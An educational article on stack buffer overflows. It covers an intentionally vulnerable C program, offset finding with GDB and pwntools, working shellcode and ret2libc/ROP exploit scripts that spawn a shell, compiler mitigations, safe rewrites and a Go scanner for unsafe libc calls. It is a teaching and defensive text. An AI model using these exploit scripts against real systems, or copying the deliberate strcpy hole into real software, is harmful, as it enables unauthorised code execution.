Buffer Overflows

Buffer overflow fundamentals - how writing past array boundaries corrupts memory, overwrites return addresses, and the compiler protections designed to stop it.

Overview

A buffer overflow is the classic memory-corruption primitive: a program writes more data into a fixed-size buffer than it can hold, and the excess spills into adjacent memory. On the stack this overwrites the saved return address, which is how an attacker redirects execution. This article explains why C arrays are unchecked, how the stack frame is laid out, and how to turn an overflow into control of the instruction pointer. It then walks through the mitigations - stack canaries, NX, ASLR, PIE, and RELRO - and how to verify them.

The Fundamental Problem

C arrays have no bounds checking. There is no runtime to verify that buf[i] is within buf 's allocated size. The compiler knows the size of the array at compile time but does not emit boundary checks - the language specification says the behavior of out-of-bounds access is undefined.

A buffer overflow occurs when a program writes more data to a buffer than the buffer can hold. The excess data spills into adjacent memory, overwriting whatever happens to be there. On the stack, the return address lives right above local variables. Writing past a local array overwrites the saved return address. When the function returns, the CPU pops the corrupted return address into RIP - and execution continues wherever the attacker wants. 

// overflow.c - Classic stack buffer overflow
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No length check - copies until null byte
    printf("Hello, %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    vulnerable(argv[1]);
    return 0;
}

strcpy has no destination size parameter. It copies bytes from src to dst until it finds a zero byte. If input is longer than 64 bytes, strcpy writes past buffer , corrupting the stack frame.

Unsafe Functions

The standard C library contains many functions with no bounds checking. Every one of them is a potential vector:

Function Danger Safe Alternative
gets() Reads until newline, no buffer size fgets(buf, size, stdin)
strcpy(dst, src) Copies until null, no size strncpy(dst, src, size)orstrlcpy
strcat(dst, src) Concatenates until null, no size strncat(dst, src, size)orstrlcat
sprintf(buf, fmt, ...) Formats with no output limit snprintf(buf, size, fmt, ...)
scanf("%s", buf) Reads until whitespace, no size scanf("%63s", buf)(width specifier)
vsprintf(buf, fmt, ...) Variadic sprintf, no size vsnprintf(buf, size, fmt, ...)
strtok() Modifies input string in place strtok_r()(reentrant version)

The "n" variants ( strncpy , strncat , snprintf ) are safer but have their own edge cases: strncpy may not null-terminate if the source is longer than the limit. strlcpy and strlcat (BSD) guarantee null-termination.

Stack Frame Layout

On x86-64 System V ABI, a typical stack frame during function execution:

High addresses
+-----------------------------+
|  argv[] strings             |  <- Top of initial stack
+-----------------------------+
|  envp[] strings             |
+-----------------------------+
|  envp[] pointers            |
+-----------------------------+
|  argv[] pointers            |
+-----------------------------+
|  argc                       |
+-----------------------------+
|  Return addr -> __libc_start|  <- main's return address
+-----------------------------+
|  Saved RBP (caller's RBP)   |  <- RBP on entry to main
+-----------------------------+
|  main's local variables     |
+-----------------------------+
|  argv (argument 2)          |  <- Passed in RSI, spilled to stack shadow
+-----------------------------+
|  argc (argument 1)          |  <- Passed in RDI, spilled to stack shadow
+-----------------------------+
|  Return addr to main()      |  <- vulnerable's return address <- TARGET
+-----------------------------+
|  Saved RBP (main's RBP)     |  <- RBP on entry to vulnerable
+-----------------------------+
|  buffer[63...0]             |  <- RSP-0x40 on entry, grows UP when writing
|  (64 bytes)                 |
+-----------------------------+
|  Stack alignment padding    |  <- May exist before buffer
+-----------------------------+
|  Red zone (128 bytes)       |  <- Reserved below RSP
+-----------------------------+
Low addresses

Writing past buffer[63] first overwrites any alignment padding, then the saved RBP (8 bytes), then the return address (8 bytes), then the function arguments (if any were passed on the stack).

Controlled Return Overwrite

Compile the vulnerable program with protections disabled for learning:

$ gcc -fno-stack-protector -z execstack -no-pie -o overflow overflow.c
Flag Disables
-fno-stack-protector Stack canary (no 8-byte guard value)
-z execstack NX bit (stack remains executable)
-no-pie PIE (fixed base address, easier to target)

First, observe normal execution:

$ ./overflow Hello
Hello, Hello

Now, overflow with a long input:

$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

The segfault confirms we overwrote the return address. Let's find the exact offset to RIP .

Finding the Offset

Use pwntools (ArchLinux: sudo pacman -S python-pwntools ): 

$ python3 -c "from pwn import *; print(cyclic(120).decode())"
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab

Run with GDB:

$ gdb --args ./overflow aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab
(gdb) run
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401246 in vulnerable ()
(gdb) info registers rip
rip            0x6161616a61616169  0x6161616a61616169

RIP = 0x6161616a61616169 . Converting to ASCII: the bytes 69 61 61 61 6a 61 61 61 = iaaajaaa . Find the offset: 

$ python3 -c "from pwn import *; print(cyclic_find(b'iaaajaaa'))"
72

The return address is 72 bytes after the start of the buffer: buffer (64) + saved RBP (8) = 72 bytes to RIP .

Let's verify with controlled input:

$ python3 -c "print('A'*72 + 'B'*8)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
$ gdb --args ./overflow $(python3 -c "print('A'*72 + 'B'*8)")
(gdb) run
Program received signal SIGSEGV, Segmentation fault.
(gdb) info registers rip
rip            0x4242424242424242  0x4242424242424242

RIP = 0x4242424242424242 = "BBBBBBBB". Perfect - we control the return address with bytes 73-80 of the input.

What the CPU Sees

At the ret instruction, the CPU does: 

RIP <- pop()   // Read 8 bytes from [RSP], increment RSP by 8

Before ret , RSP points to the location immediately above the saved RBP - which is the return address slot. The pop reads 8 bytes from there and loads them into RIP . If those bytes are attacker-controlled, RIP becomes attacker-controlled. 

; Before ret, stack at RSP:
;   [RSP+0]: return address bytes (controlled)
;   [RSP-8]: saved RBP bytes (controlled)

mov  rsp, rbp    ; Restore RSP from frame pointer
pop  rbp         ; Pop overwritten saved RBP (attacker-controlled)
ret              ; Pop overwritten return address -> RIP (attacker-controlled)

Return-to-Shellcode

Since we compiled with -z execstack , the stack is executable. We can place shellcode in the buffer and overwrite the return address to point to it.

Finding the buffer address:

$ gdb ./overflow
(gdb) break vulnerable
(gdb) run AAAA
Breakpoint 1, vulnerable (input=0x7fffffffe535 "AAAA")
(gdb) print &buffer
$1 = (char (*)[64]) 0x7fffffffe0c0

Disable ASLR for reproducibility (on your own machine, for learning):

$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Now construct the payload:

# exploit.py - Stack-based shellcode execution
import struct
import sys

# execve("/bin/sh", NULL, NULL) x86-64 shellcode (27 bytes)
shellcode = (
    b"\x48\x31\xf6"              # xor    rsi, rsi
    b"\x56"                      # push   rsi
    b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, 0x68732f2f6e69622f
    b"\x2f\x2f\x73\x68"
    b"\x57"                      # push   rdi
    b"\x54"                      # push   rsp
    b"\x5f"                      # pop    rdi
    b"\x48\x31\xd2"              # xor    rdx, rdx
    b"\xb0\x3b"                  # mov    al, 0x3b (execve syscall)
    b"\x0f\x05"                  # syscall
)

buffer_addr = 0x7fffffffe0c0
offset_to_rip = 72

payload = b"\x90" * 16           # NOP sled (padding to align)
payload += shellcode              # The shellcode
payload += b"A" * (offset_to_rip - 16 - len(shellcode))  # Padding to RIP
payload += struct.pack("<Q", buffer_addr)  # Overwrite return address

sys.stdout.buffer.write(payload)
						
$ python3 exploit.py > payload.bin

Common failure: stack alignment. System V ABI requires RSP to be 16-byte aligned before call . If the shellcode doesn't align the stack, syscall may fault. Fixed shellcode: 

# Fixed shellcode with stack alignment
shellcode = (
    b"\x48\x83\xec\x08"          # sub    rsp, 8 (fix alignment for system calls)
    b"\x48\x31\xf6"              # xor    rsi, rsi
    b"\x56"                      # push   rsi
    b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, 0x68732f2f6e69622f
    b"\x2f\x2f\x73\x68"
    b"\x57"                      # push   rdi
    b"\x54"                      # push   rsp
    b"\x5f"                      # pop    rdi
    b"\x48\x31\xd2"              # xor    rdx, rdx
    b"\xb0\x3b"                  # mov    al, 0x3b
    b"\x0f\x05"                  # syscall
)

Return-to-libc

With NX (Non-eXecutable) stack ( -z noexecstack ), the stack pages are mapped without the execute bit. Attempting to execute shellcode on the stack causes a segfault. The solution: jump to existing code - specifically libc functions like system() .

The idea:

  1. Overwrite return address with address of system() in libc
  2. Set up the argument ( "/bin/sh" string) so RDI points to it
  3. system() executes, giving a shell

Finding system() and /bin/sh : 

$ gdb ./overflow
(gdb) break main
(gdb) run
(gdb) print system
$1 = {int (const char *)} 0x7ffff7c591a0 <__libc_system>
(gdb) find &system,+9999999,"/bin/sh"
0x7ffff7db8d88
1 pattern found.

Construct the exploit:

# ret2libc.py - Bypass NX by returning to system()
import struct
import sys

offset_to_rip = 72

# ASLR off - known addresses
system_addr = 0x7ffff7c591a0
bin_sh_addr = 0x7ffff7db8d88

# ROP gadget: pop rdi; ret - to set RDI = "/bin/sh" before calling system
# Found with: ROPgadget --binary ./overflow | grep "pop rdi"
pop_rdi_ret = 0x400783  # pop rdi; ret

payload  = b"A" * offset_to_rip
payload += struct.pack("<Q", pop_rdi_ret)   # 1. Execute pop rdi; ret
payload += struct.pack("<Q", bin_sh_addr)   # 2. Value popped into RDI
payload += struct.pack("<Q", system_addr)   # 3. Jump to system("/bin/sh")

sys.stdout.buffer.write(payload)

The stack layout at ret : 

High addresses
+-----------+
| system()  |  <- Final return (RIP <- this when ROP chain is deeper)
+-----------+
| bin_sh    |  <- Value that pop rdi consumes -> RDI = "/bin/sh"
+-----------+
| pop_rdi   |  <- First return: RIP <- pop rdi gadget
+-----------+
| AAAAAAAA  |  <- Old return address (overwritten)
+-----------+
| AAAA...A  |  <- Saved RBP (overwritten)
+-----------+
| AAAA...A  |  <- buffer (64 bytes)
+-----------+

When the vulnerable function returns:

  1. ret pops pop_rdi_ret into RIP -> CPU executes pop rdi; ret
  2. pop rdi pops bin_sh_addr into RDI -> RDI = pointer to "/bin/sh"
  3. ret pops system_addr into RIP -> CPU calls system("/bin/sh")

The ROP Gadget Hunter

Finding pop rdi; ret manually: 

$ ROPgadget --binary ./overflow | grep "pop rdi"
0x0000000000400783 : pop rdi ; ret

Or directly with objdump:

$ objdump -d ./overflow | grep -A1 "5f c3"
  400783:  5f          pop    %rdi
  400784:  c3          ret

The byte sequence 5f c3 is pop rdi; ret . Searching for gadgets is pattern-matching over the binary's .text section, treating instruction boundaries as irrelevant - any offset in the code that happens to decode as useful instructions is a gadget: 

$ python3 -c "
import subprocess
data = subprocess.check_output(['objdump', '-d', './overflow'])
import re
gadgets = re.findall(r'(?:[0-9a-f]+:\s+[0-9a-f ]+\s+pop\s+%rdi)', data.decode())
print(f'Found {len(gadgets)} pop rdi gadgets')
for g in gadgets:
    print(g)
"

Stack Canaries

Compile with default protections:

$ gcc -o overflow_hardened overflow.c
$ ./overflow_hardened $(python3 -c "print('A'*100)")
*** stack smashing detected ***: terminated
Aborted (core dumped)

The program aborts instead of segfaulting. The stack protector inserted a canary - a random 8-byte value placed between the buffer and the saved RBP. Before the function returns, it checks if the canary was modified: 

; Function prologue (inserted by -fstack-protector)
sub  rsp, 0x50                      ; Allocate stack space
mov  rax, QWORD PTR fs:0x28         ; Load canary from TLS
mov  QWORD PTR [rbp-0x8], rax       ; Store canary below saved RBP

; ... function body ...

; Function epilogue
mov  rax, QWORD PTR [rbp-0x8]       ; Reload canary
xor  rax, QWORD PTR fs:0x28         ; Compare with original
je   .L_canary_ok                   ; If equal, proceed
call __stack_chk_fail               ; Otherwise abort
.L_canary_ok:
leave
ret

The canary is read from fs:0x28 (Thread-Local Storage offset 0x28). It's randomized per-thread at process startup. The attack must know or bypass the canary to overwrite the return address:

Canary bypass method How
Leak canary Format string or information leak reads the canary from a stack dump
Brute force Forking servers that reuse canary per fork (limited effectiveness)
Non-linear write Skip the canary entirely (write directly to return address)
Overwrite function pointer Target vtable pointers, GOT entries, or callback pointers instead

NX and DEP

NX (No-eXecute) is a page table flag. On x86-64, page table entries have bit 63 as the NX bit:

Page Table Entry (x86-64, 4-level paging):
+---+------+---+---+---+---+---+---+---+---+---+---+-------+
| NX| PFN  |...| A | D | G |PAT|...| R | W | X | U | P     |
+---+------+---+---+---+---+---+---+---+---+---+---+-------+
 63  62-12                                    2   1   0   0

When NX=1, the CPU faults if RIP enters that page. The kernel sets NX=1 on stack pages (unless PT_GNU_STACK says otherwise), on heap pages, and on any mmap(..., PROT_READ|PROT_WRITE) regions. Only .text pages mapped from the ELF file have NX=0.

An executable-stack binary reads the PT_GNU_STACK program header segment: 

$ readelf -l overflow | grep -A1 GNU_STACK
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000
                 0x000000 0x000000              RWE    0x10

RWE means Read + Write + Execute on the stack. Normal binaries show RW only.

ASLR and PIE

ASLR randomizes the base addresses of the stack, heap, and shared libraries. PIE (Position-Independent Executable) extends ASLR to the executable's own code: 

With ASLR (each run):
  Stack:   0x7ffc1a3b4000  ->  0x7ffd92f12000  ->  0x7fff8c4d9000
  Heap:    0x55a1b2c00000  ->  0x561ab8f00000  ->  0x557f3d200000
  libc:    0x7f1a5be00000  ->  0x7f4c2d400000  ->  0x7f8e1f900000

Combating ASLR:

Technique Description
Info leak Leak a pointer to calculate the base
Partial overwrite Overwrite only the low 1-2 bytes of a pointer (page-aligned, less entropy)
Heap spray Allocate many objects to make address ranges predictable
Brute force On 32-bit or limited ASLR, try many times

Heap Overflows

Heap overflows don't target return addresses - there are none on the heap. Instead they corrupt heap metadata (chunk headers, free list pointers) or adjacent allocated objects. The corruption vector: 

Heap chunk layout (glibc):
+--------+------+----------------------------------+
| prev_size | size | flags: PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA |
+--------+------+----------------------------------+
| fd (forward pointer - only if free)                 |
| bk (backward pointer - only if free)               |
| User data ...                                      |
| ...                                                |
+---------------------------------------------------+
| Next chunk's prev_size                             |
+---------------------------------------------------+

When the program writes past user_data into the next chunk's header, it corrupts size and potentially fd / bk (if the next chunk is free). This is covered in depth in Heap Overflows .

Safe Coding Patterns

Rewrite the vulnerable function with bounds checking:

// safe.c - The same function, not vulnerable
#include <stdio.h>
#include <string.h>

void safe_function(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';  // Guarantee null termination
    printf("Hello, %s\n", buffer);
}

Even better, use snprintf : 

void safe_function2(char *input) {
    char buffer[64];
    int written = snprintf(buffer, sizeof(buffer), "Hello, %s", input);
    if (written >= (int)sizeof(buffer)) {
        fprintf(stderr, "WARNING: Input truncated\n");
    }
    puts(buffer);
}

Compiler Protections

Protection Flag What It Does
Stack canary -fstack-protector(default) Places random guard between locals and saved RBP
Stack canary (strong) -fstack-protector-strong Protects functions with local arrays >= 8 bytes
Stack canary (all) -fstack-protector-all Protects every function
NX -z noexecstack(default) Non-executable stack
Full RELRO -z relro -z now Read-only GOT after init
PIE -fPIE -pie(default) Position-independent executable
ASLR Kernel Randomize address space
FORTIFY_SOURCE -D_FORTIFY_SOURCE=2 Compile-time check on sprintf, strcpy, etc.

ASan reports the exact source line and variable that overflowed. It works by instrumenting every memory access with shadow-memory checks, tracking which bytes are valid. The overhead is roughly 2x in CPU , 2-3x in memory, making it suitable for testing but not production.

Summary

Buffer overflows are the most fundamental memory corruption primitive. The mechanism is simple: write past an array boundary, overwrite the return address. The exploitation strategies (shellcode, ret2libc, ROP ) all derive from this core insight.

Every mitigation - canaries, NX, ASLR, PIE, RELRO, FORTIFY_SOU RCE , CFI, shadow stacks - exists because of buffer overflows. Understanding the vulnerability is necessary to understand why these protections exist and what they protect against.

Challenge

Write a Go scanner that flags unsafe libc calls before they ever reach a compiler. It reads a C source file and prints every file:line: source match, so it can be wired into a pre-commit hook or a CI job: 

package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
)

var unsafe = regexp.MustCompile(`\b(gets|strcpy|strcat|sprintf|vsprintf|scanf)\s*\(`)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintln(os.Stderr, "usage: unsafe-scan file.c")
		os.Exit(2)
	}

	f, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	hits, line := 0, 0

	for scanner.Scan() {
		line++
		if unsafe.MatchString(scanner.Text()) {
			fmt.Printf("%s:%d: %s\n", os.Args[1], line, scanner.Text())
			hits++
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Printf("%d potential unsafe calls\n", hits)
}

Run it against the vulnerable program from this article and against safe.c . Then extend the scanner to skip matches inside comments and to warn when strncpy is used without an explicit null terminator on the following line.
